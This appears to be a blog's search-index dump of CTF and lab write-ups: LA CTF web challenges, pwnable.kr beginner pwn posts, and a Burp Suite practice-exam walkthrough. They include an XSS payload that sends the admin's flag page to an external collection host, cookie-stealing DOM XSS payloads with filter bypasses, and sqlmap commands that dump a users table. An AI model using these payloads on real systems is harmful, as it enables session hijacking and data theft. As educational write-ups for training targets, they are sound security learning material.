0 files unresolvedFlag can be found inside the updated gerard_way2001.pyFlag : lactf{d0nT_6r1nk_m3rCur1al_fr0m_8_f1aSk}Web : california-state-police Stop! You’re under arrest for making suggestive 3 letter acronyms! Link: https://california-state-police.lac.tf Admin Bot (https://admin-bot.lac.tf/california-state-police) (note: the adminpw cookie is HttpOnly and SameSite=Lax)Source Code (index.js) : index.jsOne thing we know, this challenge related to CSP and how we can bypass it. The current CSP can be found either in the source code or in the response header.default-src 'none'; script-src 'unsafe-inline' default-src 'none': All types of content (scripts, images, stylesheets, etc.) are blocked from being loaded. This is a strict policy that provides a high level of security, as it prevents any malicious content from being loaded onto the page. script-src 'unsafe-inline': Inline JavaScript is allowed to be executed on the page. Inline JavaScript refers to JavaScript code that is directly included in the HTML, rather than being loaded from an external fileEverytime we request something with self or external , we will get this error.&lt;script src=\"https://california-state-police.lac.tf/report/903dfa2d-4bfe-4a00-8a08-fe0566008807\"&gt;&lt;/script&gt;But, it’s possible redirect to another website. Below are the successful javascripts we can use.window.open(\"https://URL\") ----&gt; open in new tabwindow.location.href=\"https://URL\" ----&gt; open in current tabwindow.location.replace(\"https://URL\") ----&gt; open in current tabwindow.location.assign(\"https://URL\") ----&gt; open in current tabdocument.location = \"https://URL\" ----&gt; open in current tabWe going to use 2 files Stored an HTML that will have a form with post method and retrieve the flag Stored a javascript that will get the value of the flag in file 1 and send/redirect it to the attacker URL.FILE 1&lt;!-- https://california-state-police.lac.tf/report/3f107f9c-4ffe-4fb7-a696-1175012f0d60 --&gt;&lt;form id=\"flag-form\" action=\"/flag\" method=\"post\"&gt; &lt;button type=\"submit\"&gt;Click Me&lt;/button&gt;&lt;/form&gt;&lt;script&gt; document.getElementById(\"flag-form\").submit();&lt;/script&gt;FILE 2&lt;!-- https://california-state-police.lac.tf/report/27fadbd1-a53e-4cb0-b102-40e60d049a59 --&gt;&lt;script&gt;function redirect() { let webs = window.open(\"https://california-state-police.lac.tf/report/3f107f9c-4ffe-4fb7-a696-1175012f0d60\", \"_blank\"); setTimeout(function() { let report = webs.document.documentElement.innerHTML; window.location =\"https://uhf0hn49b3o3wmk345uavj0n0e65uvik.oastify.com/?flag=\"+encodeURIComponent(report); }, 200);}redirect()&lt;/script&gt;Sending the URL of FILE 2 to admin will get us the flag.Flag : lactf{m4yb3_g1v1ng_fr33_xss_1s_jus7_4_b4d_1d3a}References https://www.youtube.com/watch?v=1AmbQU_p5TUWeb : uuid hell UUIDs are the best! I love them (if you couldn’t tell)! Link: https://uuid-hell.lac.tf/Zip file (uuid-hell.zip) : uuid-hell.zipInside server.js we can view the source code of the web application. The code sets up the following routes: /: This route used to display a unique identifier for the user and the hashes of the UUIDs of all users and admin users. If the user has a valid UUID cookie, it is checked to see if it is an admin UUID. If it is, the flag is returned, otherwise, the user is shown their UUID and the hashes of the UUIDs of all users and admin users. /createadmin: This route is a POST endpoint that creates a new “admin” UUID and adds it to the list of admin UUIDs. This endpoint is used to create an admin account.Every time an admin is created through the /createadmin route, a new UUID is added to their list. Let’s take a look at the latest MD5 for an admin.Let’s create and admin and view the latest MD5. The pink color indicates, the previous value of MD5, while yellow color indicates the latest value of MD5.curl -X POST \"https://uuid-hell.lac.tf/createadmin\"The hash created in getUsers() function.const hash = crypto.createHash('md5').update(\"admin\" + adminuuid).digest(\"hex\");\"fefc766eb7572078650ddfad91f2021b\" = MD5(\"admin\"+Admin_UUID)Next, we need to know how the Admin UUID created. These codes, will help us understand how the UUID created. The admin UUID is created in the randomUUID() function and assigned to adminid in the /createadmin route.function randomUUID() { return uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});}app.post('/createadmin', (req, res) =&gt; { const adminid = randomUUID(); adminuuids.push(adminid); if (adminuuids.length &gt; 50) { adminuuids.shift(); } res.send(\"Admin account created.\")}); uuid v1: A version 1 UUID is generated by using the combination of the current time, a MAC address of a network card (or a random value if the MAC address is not available), and a random number. This ensures that the UUID generated is unique across time and spaceI made 2 scripts fetch_hash.js and offline_brute.js.FILE 1 (fetch_hash.js)const uuid = require('uuid');const crypto = require('crypto')const axios = require('axios');// Create adminconst url_post = 'https://uuid-hell.lac.tf/createadmin';axios.post(url_post, { // Request body goes here}) .then(response =&gt; { console.log(response.data); }) .catch(error =&gt; { console.error(error); });// Get latest hash valueconst url_get = 'https://uuid-hell.lac.tf/';const regex = /:(.*)&lt;br/sconst regex2 = /((.*(\\n|\\r|\\r\\n)){2})/slet hash_web = \"\";axios.get(url_get) .then(response =&gt; { const responseData = response.data; const result = responseData.match(regex)[0]; hash_web = result.match(regex2)[2].replace(\"&lt;tr&gt;&lt;td&gt;\",\"\").replace(\"&lt;/td&gt;&lt;/tr&gt;\",\"\"); console.log(\"MD5 Hash (Web) : \"+hash_web); }) .catch(error =&gt; { console.error(error); });FILE 2 (fetch_hash.js)const uuid = require('uuid');const crypto = require('crypto')const axios = require('axios');// Argumentsconst args = process.argv;// Bruteforcingconst currentTimestamp = Date.now();for (let timestamp = currentTimestamp-100000; timestamp &lt;= currentTimestamp+100000; timestamp++) {\t// Generate UUID\tconst adminuuid = uuid.v1({\t\tmsecs: timestamp,\t\tnode: [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69],\t\tclockseq: 0b10101001100100,\t});\t\t// MD5 Hash\tconst hash = crypto.createHash('md5').update(\"admin\" + adminuuid).digest(\"hex\");\t\t// Compare MD5 hash we generate with the one we found in web\tif (hash === args[2]) {\t\t\tconsole.log(\"Original Hash : \"+hash);\tconsole.log(\"Admin UUID : \"+adminuuid);\t\t\t\tbreak;\t}}We can easily get the admin UUID with the following steps:# node fetch_hash.js Admin account created.MD5 Hash (Web) : 18664ca27547b38777fa7ef42fbdc5d5# node offline_brute.js \"18664ca27547b38777fa7ef42fbdc5d5\"Original Hash : 18664ca27547b38777fa7ef42fbdc5d5Admin UUID : 7c9e4360-ac19-11ed-aa64-67696e6b6f69Change the cookies and we will get the flag!Flag : lactf{uu1d_v3rs10n_1ch1_1s_n07_r4dn0m}" }, { "title": "Pwnable.kr - collision (Toddler’s Bottle)", "url": "/posts/Pwnable-kr-collision/", "categories": "Pwn", "tags": "Pwn, pwnable.kr", "date": "2023-02-11 08:00:00 +0800", "snippet": "Introduction Daddy told me about cool MD5 hash collision today. I wanna do something like that too! ssh fd@pwnable.kr -p2222 (pw:guest)What is Hash Collision ?Code Analysis#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){\tint* ip = (int*)p;\tint i;\tint res=0;\tfor(i=0; i&lt;5; i++){\t\tres += ip[i];\t}\treturn res;}int main(int argc, char* argv[]){\tif(argc&lt;2){\t\tprintf(\"usage : %s [passcode]\\n\", argv[0]);\t\treturn 0;\t}\tif(strlen(argv[1]) != 20){\t\tprintf(\"passcode length should be 20 bytes\\n\");\t\treturn 0;\t}\tif(hashcode == check_password( argv[1] )){\t\tsystem(\"/bin/cat flag\");\t\treturn 0;\t}\telse\t\tprintf(\"wrong passcode.\\n\");\treturn 0;}Solution" }, { "title": "Pwnable.kr - fd (Toddler’s Bottle)", "url": "/posts/Pwnable-kr-fd/", "categories": "Pwn", "tags": "Pwn, pwnable.kr", "date": "2023-02-10 08:00:00 +0800", "snippet": "Introduction Mommy! what is a file descriptor in Linux? ssh fd@pwnable.kr -p2222 (pw:guest)I am just starting my journey in the world of binary exploitation and pwn CTF challenges. Despite being a novice, I will share my experience and understanding in this blog. This series is a great starting point for beginners.What is File Descriptors (fd) ?File descriptor is a low-level mechanism used by an operating system to represent an open file or other input/output resource. It is non-negative integer that is assigned by the operating system when a file or resource is opened, and it can be used to refer to that file or resource for subsequent operations. Standard input (stdin) : This is file descriptior 0 and it is used to read input from the keyboard. Standard output (stdout) : This is file descriptor 1 and it is used to write output to the terminal. Standard error (stderr) : This is file descriptor 2 and it is used to write error messages to the terminal.Code Analysis#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[]){\tif(argc&lt;2){\t\tprintf(\"pass argv[1] a number\\n\");\t\treturn 0;\t}\tint fd = atoi( argv[1] ) - 0x1234;\tint len = 0;\tlen = read(fd, buf, 32);\tif(!strcmp(\"LETMEWIN\\n\", buf)){\t\tprintf(\"good job :)\\n\");\t\tsystem(\"/bin/cat flag\");\t\texit(0);\t}\tprintf(\"learn about Linux file IO\\n\");\treturn 0;}This is a simple C program that reads from a file descriptor (fd), specified as a CLI argument. The programs tell the user to pass a number as argv[1].It will convert the argument to an integer using atoi function, subtracts 0x1234 from it and stores the result in the fd variable.Next, the program uses the read function to read up to 32 bytes of data from the fd variable and stores the results in the buf buffer.The contents of the buf are then compare to the string \"LETMEWIN\" using the strcmp function. It will executes the /bin/cat flag if the contents are equal. atoi() : ASCII to integer. Convert a string of characters representing an integer to an actual integer value.SolutionIf we send a random number, we will get the message learn about Linux file IO.fd@pwnable:~$ ./fd 9999learn about Linux file IOIf we look carefully the original read() function it has the following signaturessize_t read(int fd, void *buf, size_t count);From our input, we need to ensure the fd variable later will hold the value of 0 for stdin. The value should be 4660.0x1234 = 4660fd = atoi( argv[1] ) - 0x1234fd = atoi('4660') - 4660fd = 4660 - 4660fd = 0To get the result, we need to run the program with argument 4660 and ensure the input contains the string LETMEWIN. If everything is set up correctly, executing the the program will display as below.fd@pwnable:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!" }, { "title": "BurpSuite Certified Practitioner Practice Exam", "url": "/posts/Burpsuite-Practice-Exam/", "categories": "Webs", "tags": "Webs", "date": "2021-11-11 08:00:00 +0800", "snippet": "IntroductionPortSwigger has introduced the Burp Suite Certified Practitioner accreditation this year. It is a three-hour exam and by passing one you’ll be able to demonstrate the ability to: Detect and exploit common web vulnerabilities. Display knowledge of fundamental web technologies Adapt attacks to evade common defenses.The Burp Suite Certified Practitioner exam costs $99 and you will need to have an active subscription to Burp Suite Professional. You can get certified by using only this 3 steps.Also, if you pass the exam before 15 Dec they will refund your $99!Burp Suite Certified Practitioner Practice ExamI will not go further into the explanation of the practice exam as you can read more in here . But there are three (3) stages that we need to complete: Stage 1: Access any user account. Stage 2: Use your user account to access the admin interface at /admin, perhaps by elevating your privileges or compromising the administrator account. Stage 3: Use the admin interface to read the contents of /home/carlos/secret from the server’s filesystem, and submit it using “submit solution”.Before we go through the practice exam, there are few things to take notes.-&gt; All the parameters found in this walkthrough might change and will not be the same as yours.Walkthrough 1/3When we open the challenge, we can see there is a search function. You can try with a simple payload to check different vulnerabilities such as single quote ('), XSS payload or etc. When we try put for example test123 and view the Burp HTTP history, we can see also searchResults.js been requested.From here, we can see inside the javascript there is eval function been used.Thanks to @r00tpgp blog, I learn something new. We can use this Chrome extension to easily discover and test inputs passed into sinks that could lead to DOM XSS vulnerabilities. Untrusted Types For DevToolsWhen we search something again, we could see this in our console.Here are payloads that will works:\"-alert(1)-\"\\\\\"-alert(1)}//\"-alert(1)}//Now, let’s create a payload to alert cookies.\"-alert(document.cookie)-\"We notice that it will get blocked.Using global variables, we can bypass it.\"-alert(window[\"document\"][\"cookie\"])-\"\"-window[\"alert\"](window[\"document\"][\"cookie\"])-\"\"-self[\"alert\"](self[\"document\"][\"cookie\"])-\"Let’s create another payload to test before send to our exploit server. But, this will also get blocked.\"-(window[\"document\"][\"location\"]=\"https://&lt;CHANGE_HERE&gt;.web-security-academy.net/?\"+window[\"document\"][\"cookie\"])-\"By replacing . with %2e we are able to bypass it.\"-(window[\"document\"][\"location\"]=\"https://&lt;CHANGE_HERE&gt;%2eweb-security-academy%2enet/?\"+window[\"document\"][\"cookie\"])-\"We can see our session key in log.When we try to use the first payload (Before URL Encode), it doesn’t work. After we use the second payload (After URL Encode), it seems to work now. You can use CyberChef as it easy to use.# Before URL Encode&lt;script&gt;location='https://&lt;CHANGE_HERE&gt;.web-security-academy.net/?find=\"-(window[\"document\"][\"location\"]=\"https://&lt;CHANGE_HERE&gt;&gt;%2eweb-security-academy%2enet/?\"+window[\"document\"][\"cookie\"])-\"';&lt;/script&gt;# After URL Encode&lt;script&gt;location='https://&lt;CHANGE_HERE&gt;.web-security-academy.net/?find=%22%2D%28window%5B%22document%22%5D%5B%22location%22%5D%3D%22https%3A%2F%2F&lt;CHANGE_HERE&gt;%252eweb%2Dsecurity%2Dacademy%252enet%2F%3F%22%2Bwindow%5B%22document%22%5D%5B%22cookie%22%5D%29%2D%22';&lt;/script&gt;Nice! We got the session cookie (Carlos) in our log.Change the session cookie and we will get login as Carlos!Walkthrough 2/3There is new features Advanced Search that we could access using Carlos account.By inserting single quote (') on the second parameter it will give us SQL Error (PostgreSQL).https://&lt;CHANGE_HERE&gt;.web-security-academy.net/advancedsearch?find=test&amp;organize_by='&amp;writer=Since we know the parameter that vulnerable to SQLi, we can now use SQLMap.(1)python sqlmap.py -u \"https://&lt;CHANGE_HERE&gt;.web-security-academy.net/advancedsearch?find=test&amp;organize_by=*&amp;writer=\" --cookie=\"_lab=&lt;CHANGE_HERE&gt;;session=&lt;CHANGE_HERE&gt;\" --batch(2) - Get Databasespython sqlmap.py -u \"https://&lt;CHANGE_HERE&gt;.web-security-academy.net/advancedsearch?find=test&amp;organize_by=*&amp;writer=\" --cookie=\"_lab=&lt;CHANGE_HERE&gt;;session=&lt;CHANGE_HERE&gt;\" --dbs --batch(3) - Get Tablespython sqlmap.py -u \"https://&lt;CHANGE_HERE&gt;.web-security-academy.net/advancedsearch?find=test&amp;organize_by=*&amp;writer=\" --cookie=\"_lab=&lt;CHANGE_HERE&gt;;session=&lt;CHANGE_HERE&gt;\" -D public --tables --batch(4) - Dump Specific Tablepython sqlmap.py -u \"https://&lt;CHANGE_HERE&gt;.web-security-academy.net/advancedsearch?find=test&amp;organize_by=*&amp;writer=\" --cookie=\"_lab=&lt;CHANGE_HERE&gt;;session=&lt;CHANGE_HERE&gt;\" -D public -T users --dump --batchWe will then be able to dump the users tables and get the administrator password!Login as administrator and delete Carlos account to complete the second (2) stage.If you want to use SQLMap in Windows, make sure you have Python2/Python3 and download the zip file from hereWalkthrough 3/3ConclusionReferences https://www.r00tpgp.com/2021/08/burp-suite-certified-practitioner-exam.html https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/ https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" } ]
